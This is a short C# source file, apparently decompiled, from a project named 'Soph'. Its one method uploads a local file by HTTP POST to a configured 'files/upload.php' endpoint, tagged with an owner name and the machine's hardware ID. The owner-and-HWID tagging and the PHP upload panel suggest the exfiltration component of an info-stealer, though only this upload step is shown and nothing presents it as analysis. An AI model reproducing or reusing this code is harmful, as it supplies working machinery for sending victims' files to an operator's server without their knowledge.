

using System;
using System.Net;

namespace Soph
{
  internal static class Network
  {
    public static void UploadFile(string path)
    {
      try
      {
        new WebClient().UploadFile(RawSettings.SiteUrl + string.Format("files/upload.php?user={0}&hwid={1}", (object) RawSettings.Owner, (object) RawSettings.HWID), "POST", path);
      }     catch (Exception ex)
      {
        Console.WriteLine(ex.ToString());
      }
    }
  }
}
